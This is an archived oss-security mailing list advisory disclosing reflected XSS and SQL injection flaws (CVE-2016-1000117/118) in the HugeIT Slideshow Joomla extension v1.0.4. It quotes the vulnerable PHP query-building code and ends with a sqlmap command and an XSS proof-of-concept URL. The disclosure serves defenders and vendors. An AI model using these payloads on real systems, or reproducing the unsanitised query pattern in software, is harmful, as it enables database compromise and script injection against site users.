X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4607" "Tuesday" "26" "July" "2016" "08:35:32" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<CC1DF991-C97A-45A4-901A-FCC32780778D@me.com>" "112" "[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4" nil nil nil "7" "2016072612:35:32" "[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4" (number mark "U       larry0@me.co Jul 26  112/4607  " thread-indent "\"[oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9253 invoked by uid 550); 26 Jul 2016 12:36:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 8154 invoked from network); 26 Jul 2016 12:35:51 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-07-26_09:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1607260142
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <CC1DF991-C97A-45A4-901A-FCC32780778D@me.com>
Date: Tue, 26 Jul 2016 08:35:32 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1469536534; bh=yi6FWtxv/Q1ccdjIwSOjMSPri3UyvWg1rOR/OBHVUEU=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=DligJleTwLil6VK4Yt0Orwg9ou1kqJMCLd0YFgVNodSyzhXEF6RLxIbJ6dDyTE1ok
 Gyc3Z20GoJjJIZIbyj//rPRfF8GdlBP1ft9+3T9FasvhAVEbQgrO0hXvWLtLjvo6I9
 0UZ0Oc0Zn8CI0XPApVL6BPGv0nbMgvtfiGgSLY/KdzALOBv1Y5oAfh3xSLZm42Qd9B
 EpgDPYhou0zIeO+ZJBe1KbE220WEstX1Nym7kMILESlmGbE7LML9MDyTDUy+FIK9ZN
 Sf0bCiESveikXuqJKEOLHa0ewYxRLOnJYyu7Fdq1Dgomstrg+K8Z/ye6eAyTzcSbai
 x8CeldscuCksg==
Subject: [oss-security] Reflected XSS & SQLi in HugeIT slideshow v1.0.4

Title: Reflected XSS & SQLi in HugeIT slideshow v1.0.4
Author: Larry W. Cashdollar, @_larry0
Date: 2016-07-17
Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
mages/slideshow/slideshow
Vendor: www.hugeit.com
Vendor Notified: 2016-07-17, fixed in v1.0.6
Vendor Contact: info@huge-it.com
Description: Huge-IT Slideshow Extension is one of the powerful products th=
at our company offers. It gives style and charm to your site and help to at=
tract the attention of visitors to certain parts of the content.
Vulnerability:
The attacker must be logged in with at least manager level access or access=
 to the administrative panel to exploit this vulnerability.

The following functions in ./models/slideshow.php are vulnerable to SQL inj=
ection as all parameters being passed to them are not sanitized:


 51     public function getPropertie() {
 52         $db =3D JFactory::getDBO();
 53         $id_cat =3D JRequest::getVar('id');
 54         $query =3D $db->getQuery(true);
 55         $query->select('#__huge_itslideshow_images.name as name,'
 56                 . '#__huge_itslideshow_images.id ,'
 57                 . '#__huge_itslideshow_slideshows.name as portName,'
 58                 . 'slideshow_id, #__huge_itslideshow_images.description=
 as     description,image_url,sl_url,sl_type,link_target,#__huge_itslidesho=
w_imag    es.ordering,#__huge_itslideshow_images.published,published_in_sl_=
width');
 59         $query->from(array('#__huge_itslideshow_slideshows' =3D> '#__hu=
ge_it    slideshow_slideshows', '#__huge_itslideshow_images' =3D> '#__huge_=
itslidesho    w_images'));
 60         $query->where('#__huge_itslideshow_slideshows.id =3D slideshow_=
id')-    >where('slideshow_id=3D' . $id_cat);
 61         $query->order('ordering desc');
 62         $db->setQuery($query);
 63         $results =3D $db->loadObjectList();
 64         return $results;
 65     }=20=20=20



 67     public function getImageByID() {
 68         $db =3D JFactory::getDBO();
 69         $id_cat =3D JRequest::getVar('id');
 70         $query =3D $db->getQuery(true);
 71         $query->select('*');
 72         $query->from('#__huge_itslideshow_images');
 73         $query->where('slideshow_id=3D' . $id_cat);
 74         $db->setQuery($query);
 75         $results =3D $db->loadObjectList();
 76         return $results;
 77     }=20



  79    public function save($data) {
 80         $db =3D JFactory::getDBO();
 81         $result =3D $this->getPropertie();
 82         $this->updarteSlideshow();
 83         $this->selectStyle();
 84         foreach ($result as $key =3D> $value) {
 85             $imageId =3D $value->id;
 86             $id =3D $data['imageId'. $imageId];
 87             $titleimage =3D $data['titleimage' . $imageId];
 88             $im_description =3D $data['im_description'. $imageId];
 89             $sl_url =3D $data['sl_url'. $imageId];
 90             $sl_link_target =3D $data['sl_link_target'. $imageId];
 91             $ordering =3D $data['order_by_'. $imageId];
 92             $image_url =3D $data['image_url'. $imageId];
 93=20
 94             $query =3D $db->getQuery(true);
 95             $query->update('#__huge_itslideshow_images')->set('name=3D"=
' . $    titleimage . '"')->set('description=3D"' . $im_description . '"')
 96                     ->set('sl_url=3D"' . $sl_url . '"')->set('link_targ=
et=3D"'     . $sl_link_target . '"')
 97                     ->set('ordering=3D"' . $ordering . '"')->set('image=
_url=3D    "' . $image_url . '"')->where('id=3D' . $imageId);
 98             $db->setQuery($query);
 99             $db->execute();

The rest of these source files all have similar vulnerabilities:

./models/fields/slideshow.php
./models/slideshows.php
./models/video.php
./models/forms/general.php
./models/general.php


Refective XSS in ./views/slideshow/tmpl/default.php in id parameter.

117:  <a class=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}=
" href=3D"index.php?option=3Dcom_slideshow&view=3Dvideo&tmpl=3Dcomponent&pi=
d=3D<?php echo $_GET['id']; ?>" title=3D"Video" >

CVE-2016-1000117 XSS
CVE-2016-1000118 SQLi

Exploit Code:
	=E2=80=A2 SQLi:
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap  --load-cookies=3Dcookies.txt -u "http://192.168.0.125/=
administrator/index.php?option=3Dcom_slideshow&view=3Dslideshow&id=3D*" --d=
bms mysql=20
	=E2=80=A2=20=20
	=E2=80=A2 XSS:
	=E2=80=A2=20=20
	=E2=80=A2 http://192.168.0.125/administrator/index.php?option=3Dcom_slides=
how&view=3Dslideshow&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
Advisory: http://www.vapidlabs.com/advisory.php?v=3D166=
